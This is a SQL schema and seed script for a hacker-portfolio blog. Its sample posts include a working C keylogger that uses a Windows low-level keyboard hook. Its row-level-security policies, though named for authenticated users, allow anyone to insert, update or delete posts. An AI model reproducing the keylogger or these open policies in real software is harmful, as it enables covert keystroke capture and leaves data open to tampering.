-- Enable UUID extension
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Create posts table
CREATE TABLE IF NOT EXISTS posts (
  id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
  title TEXT NOT NULL,
  content TEXT NOT NULL,
  tags TEXT[] DEFAULT '{}',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create admin_auth table (optional, for future use)
CREATE TABLE IF NOT EXISTS admin_auth (
  id UUID DEFAULT uuid_generate_v4() PRIMARY KEY,
  username TEXT UNIQUE NOT NULL,
  hashed_password TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable Row Level Security
ALTER TABLE posts ENABLE ROW LEVEL SECURITY;
ALTER TABLE admin_auth ENABLE ROW LEVEL SECURITY;

-- Drop existing policies if they exist
DROP POLICY IF EXISTS "Allow public read access on posts" ON posts;
DROP POLICY IF EXISTS "Allow authenticated insert on posts" ON posts;
DROP POLICY IF EXISTS "Allow authenticated update on posts" ON posts;
DROP POLICY IF EXISTS "Allow authenticated delete on posts" ON posts;

-- Create policies for posts (allow read for everyone, write for authenticated users)
CREATE POLICY "Allow public read access on posts" ON posts
  FOR SELECT USING (true);

CREATE POLICY "Allow authenticated insert on posts" ON posts
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Allow authenticated update on posts" ON posts
  FOR UPDATE USING (true);

CREATE POLICY "Allow authenticated delete on posts" ON posts
  FOR DELETE USING (true);

-- Insert sample data (only if table is empty)
INSERT INTO posts (title, content, tags) 
SELECT * FROM (VALUES
  ('Welcome to Evilkop Sentinels', 'This is the first post on my hacker portfolio. Here I will share my journey through reverse engineering, malware analysis, and exploit development.

> System initialized...
> Loading hacker protocols...
> Welcome to the digital underground.

This space will document my adventures in:
- Binary analysis and reverse engineering
- Malware research and development
- Exploit creation and testing
- Custom tool development

Stay tuned for more content!', ARRAY['welcome', 'introduction']),
  
  ('Reverse Engineering Basics', 'Today I want to share some basic concepts about reverse engineering. It all starts with understanding assembly language and how programs work at the binary level.

## Getting Started

First, you need the right tools:
- IDA Pro or Ghidra for disassembly
- x64dbg for dynamic analysis
- Hex editors for binary manipulation

## Assembly Fundamentals

Understanding x86/x64 assembly is crucial:
\`\`\`asm
mov eax, 0x41414141  ; Move value to register
push eax             ; Push to stack
call function        ; Call function
\`\`\`

The key is patience and practice. Start with simple programs and work your way up to more complex binaries.', ARRAY['reverse-engineering', 'assembly', 'tutorial']),
  
  ('Building a Simple Keylogger', 'In this post, I will walk through the process of creating a basic keylogger in C. This is for educational purposes only.

## Disclaimer
This content is for educational purposes only. Do not use this knowledge for malicious activities.

## Basic Structure

\`\`\`c
#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
            // Log the key press
            printf("Key pressed: %c\n", pKeyBoard->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                   GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
\`\`\`

Remember: Always use this knowledge responsibly!', ARRAY['keylogger', 'c', 'malware', 'educational'])
) AS v(title, content, tags)
WHERE NOT EXISTS (SELECT 1 FROM posts);
